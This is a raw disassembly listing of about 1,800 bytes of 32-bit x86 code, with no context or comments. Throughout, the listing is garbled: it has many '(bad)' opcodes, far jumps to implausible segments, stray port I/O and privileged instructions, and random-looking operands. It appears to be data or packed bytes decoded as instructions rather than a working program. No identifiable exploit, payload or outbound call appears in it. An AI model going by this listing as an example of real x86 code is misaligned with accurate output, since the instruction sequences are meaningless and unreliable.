  41a7a1:	and    bh,BYTE PTR [ecx+ebx*2-0x5acd1df9]
  41a7a8:	xor    BYTE PTR [eax],cl
  41a7aa:	(bad)  
  41a7ab:	(bad)  
  41a7ac:	push   cs
  41a7ad:	and    al,0x7a
  41a7af:	cmp    ebx,DWORD PTR [esi]
  41a7b1:	and    esp,DWORD PTR [ecx+ecx*1-0x9aa6645]
  41a7b8:	jmp    0x41a7c8
  41a7ba:	nop
  41a7bb:	fcomp  QWORD PTR [edi+edi*1]
  41a7be:	and    ecx,eax
  41a7c0:	sbb    ebp,DWORD PTR [edi+0x28b5b95]
  41a7c6:	call   DWORD PTR [eax+0x8]
  41a7c9:	add    al,0x6c
  41a7cb:	test   al,0x3b
  41a7cd:	adc    eax,0x52027319
  41a7d2:	mov    ds:0x5fb12c00,al
  41a7d7:	pop    eax
  41a7d8:	jo     0x41a769
  41a7da:	xor    al,0x7b
  41a7dc:	adc    esi,ebp
  41a7de:	sub    eax,0x51018b00
  41a7e3:	and    al,dl
  41a7e5:	xchg   esp,eax
  41a7e6:	inc    esi
  41a7e7:	or     DWORD PTR [eax],ecx
  41a7e9:	jbe    0x41a85f
  41a7eb:	push   es
  41a7ec:	push   cs
  41a7ed:	es dec edi
  41a7ef:	sub    BYTE PTR [esi-0x2c93c8f6],bh
  41a7f5:	add    BYTE PTR [edi],0x55
  41a7f8:	test   al,0x27
  41a7fa:	dec    esp
  41a7fb:	add    bh,bh
  41a7fd:	and    eax,esp
  41a7ff:	ja     0x41a7a3
  41a801:	jo     0x41a783
  41a803:	dec    ecx
  41a804:	pop    ss
  41a805:	iret   
  41a806:	cmp    ecx,edx
  41a808:	xchg   DWORD PTR [edx-0x15],esp
  41a80b:	pop    ebx
  41a80c:	adc    BYTE PTR [edx-0x3dd16f4],bl
  41a812:	rcl    BYTE PTR [esi-0x50],0x1
  41a816:	rol    BYTE PTR ds:0x30808bb8,0x17
  41a81d:	adc    DWORD PTR [esi],ebp
  41a81f:	lods   al,BYTE PTR ds:[esi]
  41a820:	or     al,0x0
  41a822:	sbb    ebx,DWORD PTR [esi]
  41a824:	pop    ecx
  41a825:	mov    eax,0x64e2b042
  41a82a:	(bad)  
  41a82b:	cwde   
  41a82c:	cmp    al,0x7c
  41a82e:	adc    cl,al
  41a830:	or     dh,bl
  41a832:	outs   dx,DWORD PTR ds:[esi]
  41a833:	ret    
  41a834:	or     DWORD PTR [eax+0x210b043],ecx
  41a83a:	ret    
  41a83b:	add    al,0xa
  41a83d:	or     eax,0x28a639e1
  41a842:	ret    
  41a843:	(bad)  
  41a844:	sbb    cl,BYTE PTR [ecx]
  41a846:	pop    edx
  41a847:	push   ss
  41a848:	pop    esp
  41a849:	push   ebp
  41a84a:	shl    BYTE PTR [eax-0x4becab48],cl
  41a850:	clc    
  41a851:	xchg   edi,eax
  41a852:	test   BYTE PTR [edi-0x15a78af],0x6f
  41a859:	mov    dh,bl
  41a85b:	sbb    al,0xf
  41a85d:	mov    bh,0x14
  41a85f:	dec    edx
  41a860:	inc    ecx
  41a861:	cmp    edx,0x7f
  41a864:	ja     0x41a86c
  41a866:	mov    BYTE PTR [esi-0x7d905e9],cl
  41a86c:	inc    esi
  41a86d:	jmp    0x41a8c8
  41a86f:	cmp    edx,0x8d3176d5
  41a875:	pop    esi
  41a876:	add    ebp,DWORD PTR [esi]
  41a878:	cld    
  41a879:	ja     0x41a8ea
  41a87b:	(bad)  
  41a87c:	(bad)  
  41a87d:	outs   dx,DWORD PTR ds:[esi]
  41a87e:	stos   BYTE PTR es:[edi],al
  41a87f:	fcmovb st,st(1)
  41a881:	jmp    0x41a88f
  41a883:	or     bl,0xe0
  41a886:	mov    BYTE PTR [eax+esi*1],bl
  41a889:	or     al,BYTE PTR [esi]
  41a88b:	and    bl,0x3f
  41a88e:	or     eax,0x885c8880
  41a893:	xchg   edi,eax
  41a894:	in     eax,dx
  41a895:	push   edx
  41a896:	mov    edx,0xca09e280
  41a89b:	push   esp
  41a89c:	xor    BYTE PTR [edx],al
  41a89e:	retf   
  41a89f:	rep ins BYTE PTR es:[edi],dx
  41a8a1:	xchg   edi,eax
  41a8a2:	jmp    0x622:0x23020eb
  41a8a9:	sar    ah,0x56
  41a8ac:	xor    esp,DWORD PTR es:[ecx]
  41a8af:	add    DWORD PTR [ecx*2+0x3b057308],ebx
  41a8b6:	sbb    ebp,DWORD PTR ds:0x72964bbf
  41a8bc:	mov    al,BYTE PTR [esp+eax*1]
  41a8bf:	mov    ecx,DWORD PTR [esi-0x18]
  41a8c2:	xor    BYTE PTR [ebp-0x42],bh
  41a8c5:	imul   BYTE PTR [ebp-0x7c]
  41a8c8:	and    bl,BYTE PTR [eax]
  41a8ca:	sbb    eax,0x764889ea
  41a8cf:	or     bl,al
  41a8d1:	fidiv  WORD PTR [ebp+0x46018383]
  41a8d7:	add    BYTE PTR [edx+esi*2],bl
  41a8da:	jecxz  0x41a869
  41a8dc:	push   esi
  41a8dd:	loopne 0x41a8a1
  41a8df:	shr    eax,0x4c
  41a8e2:	test   BYTE PTR [ebx-0x25],0xf0
  41a8e6:	mov    dl,0xcb
  41a8e8:	dec    eax
  41a8e9:	inc    ebp
  41a8ea:	inc    ebx
  41a8eb:	pop    ecx
  41a8ec:	add    BYTE PTR [eax-0x10],ah
  41a8ef:	inc    ebp
  41a8f0:	(bad)  
  41a8f1:	ds add dl,bl
  41a8f4:	mov    WORD PTR [edi],0xc024
  41a8f9:	jmp    0x41a8f2
  41a8fb:	xor    BYTE PTR [esi+0xf],0xcc
  41a8ff:	cld    
  41a900:	jmp    0xff5a:0xdef94419
  41a907:	(bad)  
  41a908:	dec    edi
  41a909:	std    
  41a90a:	mov    cl,BYTE PTR [edx+esi*1]
  41a90d:	inc    esi
  41a90e:	test   cl,0x80
  41a911:	push   ebp
  41a912:	xchg   BYTE PTR [eax],cl
  41a914:	jae    0xb08807
  41a91a:	sbb    al,0x83
  41a91c:	loope  0x41a95d
  41a91e:	adc    BYTE PTR [eax],ah
  41a920:	je     0x41a950
  41a922:	push   ds
  41a923:	mov    dl,BYTE PTR [edx+eax*1]
  41a926:	pop    ebx
  41a927:	ins    BYTE PTR es:[edi],dx
  41a928:	lods   eax,DWORD PTR ds:[esi]
  41a929:	sbb    al,0xc0
  41a92b:	jecxz  0x41a8ed
  41a92d:	es or  al,0x6a
  41a931:	addr16 (bad) 
  41a933:	int3   
  41a934:	mov    ebx,0x81ccb225
  41a939:	loop   0x41a98e
  41a93b:	mov    dh,0xd5
  41a93d:	fwait
  41a93e:	cld    
  41a93f:	shl    ecx,0x6
  41a942:	or     edi,DWORD PTR [ebx-0x5772d236]
  41a948:	jle    0x41a981
  41a94a:	fs and al,0x66
  41a94d:	and    eax,0x8966fc4d
  41a952:	adc    al,0x41
  41a954:	fwait
  41a955:	pop    ebx
  41a956:	mov    ebx,0x855a4db
  41a95b:	or     al,0x42
  41a95d:	inc    eax
  41a95e:	dec    ebp
  41a95f:	jmp    0x41a96a
  41a961:	cmp    eax,DWORD PTR [edx-0x55840790]
  41a967:	jae    0x41a90b
  41a969:	or     BYTE PTR [edx+0x30],dh
  41a96c:	dec    eax
  41a96d:	push   ds
  41a96e:	mov    DWORD PTR [edx+eax*2],0x6becdb2d
  41a975:	xchg   edx,eax
  41a976:	inc    edi
  41a977:	and    DWORD PTR [edx+0x5b],eax
  41a97a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a97b:	ret    0xb30
  41a97e:	mov    dl,0x35
  41a980:	not    DWORD PTR [eax]
  41a982:	xor    eax,0x14a20c57
  41a987:	push   cs
  41a988:	mov    ebx,0x725befb0
  41a98d:	cli    
  41a98e:	xor    BYTE PTR [ebp+0x1e],0x1b
  41a992:	sbb    DWORD PTR [ebx],edx
  41a994:	or     ah,BYTE PTR [ebx+0x18]
  41a997:	inc    esi
  41a998:	xchg   ebx,eax
  41a999:	clc    
  41a99a:	jb     0x41a95a
  41a99c:	inc    eax
  41a99d:	push   ebp
  41a99e:	ds adc al,0x21
  41a9a1:	push   0x98eb77cd
  41a9a6:	jno    0x41a92a
  41a9a8:	inc    ecx
  41a9a9:	sahf   
  41a9aa:	ins    DWORD PTR es:[edi],dx
  41a9ab:	inc    esi
  41a9ac:	pop    ss
  41a9ad:	(bad)  
  41a9ae:	cmp    BYTE PTR [eax+0x77],ch
  41a9b1:	inc    ecx
  41a9b2:	mov    ds:0xa8032742,eax
  41a9b7:	je     0x41aa17
  41a9b9:	or     dh,BYTE PTR [ebx+0xc2fc4c2]
  41a9bf:	lea    edx,[esi+eax*1]
  41a9c2:	loopne 0x41aa38
  41a9c4:	adc    al,0x27
  41a9c6:	adc    WORD PTR [ecx+0x41d6cc3b],dx
  41a9cd:	into   
  41a9ce:	dec    edx
  41a9cf:	int3   
  41a9d0:	adc    DWORD PTR [ecx+esi*1-0x57a2c044],ecx
  41a9d7:	fadd   QWORD PTR [edx-0x6a9fbcc0]
  41a9dd:	ror    BYTE PTR [edx-0x40],1
  41a9e0:	jne    0x41a995
  41a9e2:	xchg   DWORD PTR [edi],esi
  41a9e4:	jmp    0x41a9ee
  41a9e6:	or     DWORD PTR [esi-0x3a],ebx
  41a9e9:	in     al,0xc
  41a9eb:	cmp    esp,DWORD PTR [eax]
  41a9ed:	sbb    eax,0x1e46d275
  41a9f2:	push   ds
  41a9f3:	fld    DWORD PTR [edx+eax*4-0x546877ef]
  41a9fa:	push   edi
  41a9fb:	or     DWORD PTR [esi-0x213844a4],edx
  41aa01:	inc    edi
  41aa02:	mov    esp,0x805d5ee6
  41aa07:	mov    DWORD PTR [edx+eax*2+0x45],ebp
  41aa0b:	aaa    
  41aa0c:	cmp    DWORD PTR [eax+0x30],ebx
  41aa0f:	adc    BYTE PTR [ebx+0x139a9c34],ah
  41aa15:	jb     0x41aa03
  41aa17:	xor    BYTE PTR [ecx],dl
  41aa19:	mov    WORD PTR [ebx-0x7ecac3bc],fs
  41aa1f:	pushf  
  41aa20:	in     al,0x90
  41aa22:	js     0x41aa57
  41aa24:	xor    ebp,DWORD PTR [ebx+edx*4+0x47]
  41aa28:	leave  
  41aa29:	leave  
  41aa2a:	ret    0x4733
  41aa2d:	or     ebx,ebp
  41aa2f:	xlat   BYTE PTR ds:[ebx]
  41aa30:	(bad)  
  41aa31:	jo     0x41aa61
  41aa33:	xlat   BYTE PTR ds:[ebx]
  41aa34:	xor    al,0x7c
  41aa36:	adc    dh,0x4f
  41aa39:	inc    ebp
  41aa3a:	ins    DWORD PTR es:[edi],dx
  41aa3b:	sbb    DWORD PTR [eax+edx*4],0x4a124774
  41aa42:	sub    DWORD PTR ds:[eax+0x3d3a8114],ebx
  41aa49:	cmp    DWORD PTR [ebx+0x27],0x15095b80
  41aa50:	and    DWORD PTR [ebp+0x2a],edi
  41aa53:	scas   al,BYTE PTR es:[edi]
  41aa54:	push   ss
  41aa55:	lea    ecx,[edx+0x52]
  41aa58:	push   ecx
  41aa59:	cmp    edi,DWORD PTR ds:0x3062da89
  41aa5f:	adc    al,0xb1
  41aa61:	pusha  
  41aa62:	enter  0xac7,0xb8
  41aa66:	adc    DWORD PTR [eax-0x3a],ebp
  41aa69:	sbb    DWORD PTR [edx],ecx
  41aa6b:	ror    BYTE PTR [edi+0x1ea5c9a4],0x5
  41aa72:	sub    BYTE PTR [edi+0x0],dl
  41aa75:	adc    BYTE PTR [edi],ch
  41aa77:	inc    eax
  41aa78:	test   DWORD PTR [eax+0x29badc10],ebp
  41aa7e:	(bad)  
  41aa7f:	xchg   ecx,eax
  41aa80:	arpl   WORD PTR [ebx+0x47],di
  41aa83:	(bad)  
  41aa84:	push   0x7
  41aa86:	lea    edx,[ebp-0xb]
  41aa89:	push   edx
  41aa8a:	push   0x9b6ec17b
  41aa8f:	test   DWORD PTR [ebx],eax
  41aa91:	cwde   
  41aa92:	lock adc DWORD PTR [ecx-0x50812ff9],edi
  41aa99:	pushf  
  41aa9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa9b:	das    
  41aa9c:	bts    DWORD PTR [eax+ebx*8],ebx
  41aaa0:	xchg   edx,eax
  41aaa1:	pop    es
  41aaa2:	push   esi
  41aaa3:	mov    dl,BYTE PTR [edi-0x7b]
  41aaa6:	mov    ch,0xca
  41aaa8:	fld    QWORD PTR [edx+0x31704244]
  41aaae:	mov    esi,0x9e4d143d
  41aab3:	loopne 0x41ab28
  41aab5:	adc    ecx,DWORD PTR [eax+0x2e]
  41aab8:	aad    0x67
  41aaba:	sub    bh,dh
  41aabc:	dec    ecx
  41aabd:	mov    ah,0x75
  41aabf:	and    edi,DWORD PTR [eax-0x129fafa8]
  41aac5:	and    cl,BYTE PTR [edi]
  41aac7:	jnp    0x41ab01
  41aac9:	or     DWORD PTR [ebx-0x20],edx
  41aacc:	add    al,0xb
  41aace:	enter  0x186d,0xec
  41aad2:	sbb    BYTE PTR [edi+0x48],0x35
  41aad6:	push   edi
  41aad7:	clc    
  41aad8:	pop    ds
  41aad9:	sub    DWORD PTR ds:0xf4b341f8,0x42
  41aae0:	add    DWORD PTR [ebp+eax*8+0x20806c6],ecx
  41aae7:	xchg   ebx,eax
  41aae8:	pop    edi
  41aae9:	add    BYTE PTR [ecx],al
  41aaeb:	mov    bl,0x1a
  41aaed:	push   eax
  41aaee:	inc    esi
  41aaef:	iret   
  41aaf0:	pop    esp
  41aaf1:	xor    BYTE PTR [esi+0x29],0x39
  41aaf5:	xor    BYTE PTR [ebx+0x20],cl
  41aaf8:	mov    ah,0x8
  41aafa:	mov    cl,0xc7
  41aafc:	sahf   
  41aafd:	and    ah,0x80
  41ab00:	sbb    ax,0xb04c
  41ab04:	xlat   BYTE PTR ds:[ebx]
  41ab05:	or     al,al
  41ab07:	inc    ebx
  41ab08:	cmp    eax,ecx
  41ab0a:	push   edx
  41ab0b:	sbb    BYTE PTR [ebx-0x1c],dl
  41ab0e:	or     BYTE PTR [eax+esi*8-0x1df28987],dh
  41ab15:	cmp    al,0x9
  41ab17:	add    al,BYTE PTR [eax+edi*1-0x4132da84]
  41ab1e:	mov    al,ds:0x2d3fda13
  41ab23:	adc    BYTE PTR [esi-0x4c],al
  41ab26:	adc    DWORD PTR ds:0x769366e7,edi
  41ab2c:	pop    edi
  41ab2d:	add    BYTE PTR [eax+ebp*4+0x39],al
  41ab31:	mov    eax,0xf9532003
  41ab36:	inc    edx
  41ab37:	neg    bl
  41ab39:	imul   BYTE PTR [ebx+eiz*4+0x14]
  41ab3d:	jmp    0x41ab4e
  41ab3f:	adc    BYTE PTR [esi+0x74],dl
  41ab42:	push   ss
  41ab43:	js     0x41ab56
  41ab45:	in     eax,dx
  41ab46:	xor    bl,dl
  41ab48:	pop    ebx
  41ab49:	out    0xc0,al
  41ab4b:	pusha  
  41ab4c:	nop
  41ab4d:	inc    ecx
  41ab4e:	mov    BYTE PTR [edi],0xe8
  41ab51:	in     al,0xe0
  41ab53:	jge    0x41ab45
  41ab55:	test   eax,0xc16af3ad
  41ab5a:	dec    ecx
  41ab5b:	adc    BYTE PTR [edi],dh
  41ab5d:	mov    eax,0x11c80418
  41ab62:	dec    edi
  41ab63:	stos   DWORD PTR es:[edi],eax
  41ab64:	xor    al,0x42
  41ab66:	lock and eax,esi
  41ab69:	and    dh,BYTE PTR [esi]
  41ab6b:	inc    ebx
  41ab6c:	cwde   
  41ab6d:	jmp    esp
  41ab6f:	add    BYTE PTR [ebx+eiz*1],bl
  41ab72:	enter  0xf3e2,0x49
  41ab76:	sub    BYTE PTR [ebp+0x17],bh
  41ab79:	pop    eax
  41ab7a:	mov    dh,0xef
  41ab7c:	or     al,0x14
  41ab7e:	rcl    DWORD PTR [eax-0x5f],0x29
  41ab82:	push   eax
  41ab83:	pop    eax
  41ab84:	adc    esi,DWORD PTR [ebp+0x14201bf1]
  41ab8a:	mov    bl,BYTE PTR [ebx-0x69d3eda4]
  41ab90:	mov    eax,0x26d584c1
  41ab95:	fs xchg edi,eax
  41ab97:	sub    al,0x17
  41ab99:	cmp    BYTE PTR [edx+0x3c826c6c],bh
  41ab9f:	cmp    al,0x2b
  41aba1:	sbb    BYTE PTR [eax-0x6d],ch
  41aba4:	in     eax,dx
  41aba5:	add    bl,BYTE PTR [edx]
  41aba7:	hlt    
  41aba8:	and    BYTE PTR [eax-0x3d],ch
  41abab:	adc    bl,bl
  41abad:	and    al,bh
  41abaf:	adc    ebx,ebp
  41abb1:	ret    
  41abb2:	mov    eax,0xf89f9c20
  41abb7:	mov    bh,0x2
  41abb9:	inc    esi
  41abba:	jmp    0xb349:0x5c31cdbd
  41abc1:	mov    bl,0xef
  41abc3:	sti    
  41abc4:	pop    ecx
  41abc5:	pusha  
  41abc6:	xor    ah,BYTE PTR [eax+0x15]
  41abc9:	mov    al,ds:0x5806a41c
  41abce:	sbb    al,0x7b
  41abd0:	mov    edi,0xbac021a8
  41abd5:	ds test al,0x2a
  41abd8:	xchg   esp,eax
  41abd9:	jae    0x41ab67
  41abdb:	xchg   edi,eax
  41abdc:	cmp    al,0x63
  41abde:	das    
  41abdf:	dec    edx
  41abe0:	cmp    DWORD PTR [esi+0x64],edx
  41abe3:	or     ch,BYTE PTR [edi+0x4a072589]
  41abe9:	inc    eax
  41abea:	arpl   WORD PTR ds:0x2e40641e,bp
  41abf0:	imul   ebx,DWORD PTR [eax+0x46c7137],0x65
  41abf7:	dec    edx
  41abf8:	push   cs
  41abf9:	js     0x41ac67
  41abfb:	sbb    DWORD PTR [ebx+edi*1+0x762cb5d],esp
  41ac02:	jl     0x41ac7c
  41ac04:	fs nop
  41ac06:	inc    ecx
  41ac07:	push   es
  41ac08:	je     0x41ac7a
  41ac0a:	ins    BYTE PTR es:[edi],dx
  41ac0b:	nop
  41ac0c:	inc    ecx
  41ac0d:	push   es
  41ac0e:	sbb    DWORD PTR [eax+0x64],ebp
  41ac11:	pusha  
  41ac12:	inc    ecx
  41ac13:	push   es
  41ac14:	sbb    DWORD PTR [esp+ebx*2+0x58],esp
  41ac18:	push   esp
  41ac19:	push   es
  41ac1a:	sbb    DWORD PTR [eax+edx*4+0x50],esp
  41ac1e:	dec    esp
  41ac1f:	dec    eax
  41ac20:	inc    esp
  41ac21:	sbb    DWORD PTR [eax+edx*4+0x41],esp
  41ac25:	inc    eax
  41ac26:	cmp    al,0x38
  41ac28:	fs nop
  41ac2a:	inc    ecx
  41ac2b:	push   es
  41ac2c:	xor    al,0x30
  41ac2e:	sub    al,0x90
  41ac30:	inc    ecx
  41ac31:	push   es
  41ac32:	sbb    DWORD PTR [eax],ebp
  41ac34:	and    al,0x20
  41ac36:	inc    ecx
  41ac37:	push   es
  41ac38:	sbb    DWORD PTR [esp+ebx*1+0x18],esp
  41ac3c:	adc    al,0x6
  41ac3e:	sbb    DWORD PTR [eax+edx*4+0x10],esp
  41ac42:	or     al,0x8
  41ac44:	add    al,0x32
  41ac46:	enter  0x4193,0x0
  41ac4a:	popa   
  41ac4b:	cld    
  41ac4c:	clc    
  41ac4d:	nop
  41ac4e:	inc    ecx
  41ac4f:	sahf   
  41ac50:	or     al,0xf4
  41ac52:	(bad)  
  41ac53:	ror    ah,1
  41ac55:	inc    ecx
  41ac56:	push   es
  41ac57:	sbb    DWORD PTR [eax+ecx*8-0x3c],esp
  41ac5b:	rol    BYTE PTR [esi],0x19
  41ac5e:	fs nop
  41ac60:	mov    esp,0x19b0b4b8
  41ac65:	fs nop
  41ac67:	inc    ecx
  41ac68:	lods   al,BYTE PTR ds:[esi]
  41ac69:	test   al,0xa4
  41ac6b:	fs nop
  41ac6d:	inc    ecx
  41ac6e:	push   es
  41ac6f:	mov    al,ds:0x4190989c
  41ac74:	push   es
  41ac75:	sbb    DWORD PTR [eax+edx*4+0x1906418c],edx
  41ac7c:	fs mov al,bh
  41ac7f:	hlt    
  41ac80:	push   es
  41ac81:	sbb    DWORD PTR [eax+edx*4-0x4],esp
  41ac85:	lock in al,dx
  41ac87:	call   0x41d210a5
  41ac8c:	in     al,0xe0
  41ac8e:	fcom   QWORD PTR [eax-0x27f9ae6d]
  41ac94:	aas    
  41ac95:	dec    esp
  41ac96:	mov    cl,0x4c
  41ac98:	leave  
  41ac99:	add    DWORD PTR [ecx],ebx
  41ac9b:	jo     0x41ace9
  41ac9d:	mov    eax,0xe9dd2070
  41aca2:	mov    ds:0x7fef0dc,eax
  41aca7:	icebp  
  41aca8:	or     DWORD PTR [edx+esi*1],0xffffffc8
  41acac:	repnz repz hlt 
  41acaf:	cmc    
  41acb0:	or     al,0x32
  41acb2:	enter  0xf620,0xf7
  41acb6:	clc    
  41acb7:	xor    cl,al
  41acb9:	and    BYTE PTR [ebx-0x37040507],al
  41acbf:	and    BYTE PTR [ebx-0x10203f4],al
  41acc5:	and    BYTE PTR [ebx-0x1f00cdf4],al
  41accb:	loope  0x41ac50
  41accd:	or     al,0x32
  41accf:	enter  0xe3e2,0xe4
  41acd3:	in     eax,0xa
  41acd5:	xor    cl,al
  41acd7:	and    dh,ah
  41acd9:	out    0x20,eax
  41acdb:	pop    ebp
  41acdc:	shr    DWORD PTR [ebp+0x7d],cl
  41acdf:	dec    esi
  41ace0:	mov    BYTE PTR [edi],al
  41ace2:	jmp    0x842bc477
  41ace7:	or     al,0x32
  41ace9:	fsubr  st,st(3)
  41aceb:	pop    es
  41acec:	in     al,dx
  41aced:	in     eax,dx
  41acee:	out    dx,al
  41acef:	or     al,0x32
  41acf1:	enter  0xef20,0xd0
  41acf5:	shl    DWORD PTR [edx],1
  41acf7:	enter  0x8320,0xd2
  41acfb:	rcl    esp,cl
  41acfd:	enter  0x8320,0xc
  41ad01:	aad    0xd6
  41ad03:	xlat   BYTE PTR ds:[ebx]
  41ad04:	sub    DWORD PTR [ebx-0x2627cdf4],eax
  41ad0a:	ficom  DWORD PTR [eax-0x24e6f9bf]
  41ad10:	(bad)  
  41ad12:	inc    ecx
  41ad13:	push   es
  41ad14:	sbb    DWORD PTR [esi+ebx*8-0x21],esp
  41ad18:	rol    BYTE PTR [esi],0x19
  41ad1b:	fs nop
  41ad1d:	rol    edx,0xc3
  41ad20:	les    ebx,FWORD PTR [ecx]
  41ad22:	fs nop
  41ad24:	inc    ecx
  41ad25:	(bad)
  41ad28:	fs nop
  41ad2a:	inc    ecx
  41ad2b:	push   es
  41ad2c:	enter  0xcac9,0x90
  41ad30:	inc    ecx
  41ad31:	push   es
  41ad32:	sbb    ebx,ecx
  41ad34:	int3   
  41ad35:	int    0x41
  41ad37:	push   es
  41ad38:	sbb    DWORD PTR [esi+ecx*8-0x31],esp
  41ad3c:	mov    al,0x6
  41ad3e:	sbb    DWORD PTR [eax+edx*4-0x4f],esp
  41ad42:	mov    dl,0xb3
  41ad44:	mov    ah,0x19
  41ad46:	fs nop
  41ad48:	inc    ecx
  41ad49:	mov    ch,0xb6
  41ad4b:	mov    bh,0x64
  41ad4d:	nop
  41ad4e:	inc    ecx
  41ad4f:	push   es
  41ad50:	mov    eax,0x4190bab9
  41ad55:	push   es
  41ad56:	sbb    DWORD PTR [ebx+0x641bdbc],edi
  41ad5c:	sbb    DWORD PTR [esi+edi*4-0x41],esp
  41ad60:	mov    al,ds:0x90641906
  41ad65:	mov    eax,ds:0x19a4a3a2
  41ad6a:	fs nop
  41ad6c:	inc    ecx
  41ad6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad70:	and    al,0x99
  41ad72:	inc    ecx
  41ad73:	push   es
  41ad74:	test   al,0xa9
  41ad76:	pop    es
  41ad77:	jb     0x41adb9
  41ad79:	push   es
  41ad7a:	in     al,0x4f
  41ad7c:	mov    ecx,0x20c04f74
  41ad81:	mov    dh,0x30
  41ad83:	push   ebx
  41ad84:	je     0x41adbe
  41ad86:	sbb    al,cl
  41ad88:	push   ebx
  41ad89:	jb     0x41ad1d
  41ad8b:	mov    edi,0x2a501850
  41ad90:	or     al,0x20
  41ad92:	arpl   WORD PTR [ebx-0x37],ax
  41ad95:	or     al,0xe
  41ad97:	aaa    
  41ad98:	add    DWORD PTR [ebx+ebx*4-0x1],esp
  41ad9c:	fld    QWORD PTR [edi+eax*2]
  41ad9f:	or     DWORD PTR [ebp+0x78],eax
  41ada2:	arpl   WORD PTR [ebp+0x70],sp
  41ada5:	je     0x41ae10
  41ada7:	outs   dx,DWORD PTR ds:[esi]
  41ada8:	outs   dx,BYTE PTR ds:[esi]
  41ada9:	add    BYTE PTR [eax],0x0
  41adac:	adc    eax,0x1f4b6c72
  41adb1:	adc    BYTE PTR [edi+0x4f],ah
  41adb4:	int3   
  41adb5:	mov    edx,0x94e47ec9
  41adba:	inc    esp
  41adbb:	inc    ebp
  41adbc:	dec    eax
  41adbd:	gs popa 
  41adbf:	jo     0x41ae1b
  41adc1:	nop
  41adc2:	pop    ebx
  41adc3:	fcom   QWORD PTR [esp+edi*1+0x50dc4a19]
  41adca:	xor    al,0x37
  41adcc:	pop    es
  41adcd:	(bad)  
  41adce:	jg     0x41addc
  41add0:	inc    ebp
  41add1:	dec    edi
  41add2:	jne    0x41ae48
  41add4:	dec    edi
  41add5:	dec    bp
  41add7:	gs ins DWORD PTR es:[edi],dx
  41add9:	outs   dx,DWORD PTR ds:[esi]
  41adda:	jb     0x41ae55
  41addc:	xlat   BYTE PTR ds:[ebx]
  41addd:	mov    bh,0x51
  41addf:	cmp    BYTE PTR [eax+0x51245e4a],dh
  41ade5:	cmp    dl,dl
  41ade7:	mov    ch,0xbb
  41ade9:	lahf   
  41adea:	pop    ds
  41adeb:	or     eax,DWORD PTR [ebp+0x49]
  41adee:	outs   dx,BYTE PTR ds:[esi]
  41adef:	pop    ebp
  41adf0:	inc    ebp
  41adf1:	jb     0x41ae65
  41adf3:	pop    ebx
  41adf4:	push   edi
  41adf5:	nop
  41adf6:	test   DWORD PTR [ecx],edx
  41adf8:	enter  0x9050,0x65
  41adfc:	or     DWORD PTR [edx+0x740b0b14],esp
  41ae02:	push   ebx
  41ae03:	mov    bl,0xb
  41ae05:	fs mov ebx,0x5116379c
  41ae0b:	mov    al,ds:0x8e491f57
  41ae10:	mov    dl,0xee
  41ae12:	rol    BYTE PTR [edi],1
  41ae14:	inc    esp
  41ae15:	push   edi
  41ae16:	adc    bh,BYTE PTR [eax+ecx*8+0x526b081e]
  41ae1d:	dec    eax
  41ae1e:	mov    bh,0x52
  41ae20:	dec    eax
  41ae21:	and    cl,0x2a
  41ae24:	fwait
  41ae25:	pop    edi
  41ae26:	or     DWORD PTR [edi],ecx
  41ae28:	or     eax,0x6e6c9432
  41ae2d:	mov    bh,0x57
  41ae2f:	mov    al,ds:0x947ffea0
  41ae34:	or     al,0xfc
  41ae36:	or     al,BYTE PTR [ebp+0x44]
  41ae39:	imul   esi,DWORD PTR [esi+0x42],0x72655a79
  41ae40:	outs   dx,DWORD PTR ds:[esi]
  41ae41:	nop
  41ae42:	or     BYTE PTR [eax+ebp*1+0x69],ah
  41ae46:	clc    
  41ae47:	clc    
  41ae48:	mov    dl,0x83
  41ae4a:	cld    
  41ae4b:	ret    0x52bf
  41ae4e:	popa   
  41ae4f:	outs   dx,BYTE PTR ds:[esi]
  41ae50:	addr16 gs push ebx
  41ae53:	push   eax
  41ae54:	push   edi
  41ae55:	aaa    
  41ae56:	inc    esi
  41ae57:	and    BYTE PTR [edi],ch
  41ae59:	push   ebx
  41ae5a:	push   eax
  41ae5b:	jae    0x41aea6
  41ae5d:	outs   dx,BYTE PTR ds:[esi]
  41ae5e:	dec    edx
  41ae5f:	mov    dh,0xf3
  41ae61:	das    
  41ae62:	jbe    0x41aec9
  41ae64:	jb     0x41aecc
  41ae66:	ins    BYTE PTR es:[edi],dx
  41ae67:	outs   dx,DWORD PTR ds:[esi]
  41ae68:	ja     0x41aec5
  41ae6a:	lods   al,BYTE PTR ds:[esi]
  41ae6b:	sub    eax,0xac18408c
  41ae70:	arpl   WORD PTR [ebx],cx
  41ae72:	dec    ebp
  41ae73:	and    al,0xb7
  41ae75:	mov    cl,0x2
  41ae77:	push   esi
  41ae78:	mov    dl,0x90
  41ae7a:	push   edi
  41ae7b:	push   esp
  41ae7c:	add    al,0x5b
  41ae7e:	and    eax,0x4545e4f
  41ae83:	push   ebx
  41ae84:	pusha  
  41ae85:	mov    bl,0x50
  41ae87:	bnd jge 0x41aeed
  41ae8a:	jbe    0x41aea4
  41ae8c:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x850e5c57
  41ae94:	adc    eax,ecx
  41ae96:	pop    esp
  41ae97:	arpl   WORD PTR [esi+0x19b74943],si
  41ae9d:	mov    edi,0xb4576559
  41aea2:	mov    ah,0x21
  41aea4:	xor    al,0x46
  41aea6:	and    BYTE PTR [ebx+0x60],ch
  41aea9:	in     al,0x45
  41aeab:	ret    0x6b8f
  41aeae:	push   ebp
  41aeaf:	or     al,0x7
  41aeb1:	push   ebp
  41aeb2:	or     al,0xa4
  41aeb4:	cmp    edi,ebx
  41aeb6:	or     dl,BYTE PTR [ebp+0x6e]
  41aeb9:	fs pop eax
  41aebb:	nop
  41aebc:	push   edi
  41aebd:	fs loope 0x41aec8
  41aec0:	lods   al,BYTE PTR ds:[esi]
  41aec1:	mov    eax,ds:0x5f0f8764
  41aec6:	je     0x41ae76
  41aec8:	mov    BYTE PTR [edi],cl
  41aeca:	push   eax
  41aecb:	outs   dx,DWORD PTR ds:[esi]
  41aecc:	imul   esp,DWORD PTR [eax],0xc086c05b
  41aed2:	cmp    dl,BYTE PTR [eax+eax*8-0x37f3d0f4]
  41aed9:	mov    ?,ecx
  41aedb:	ret    
  41aedc:	pop    ebx
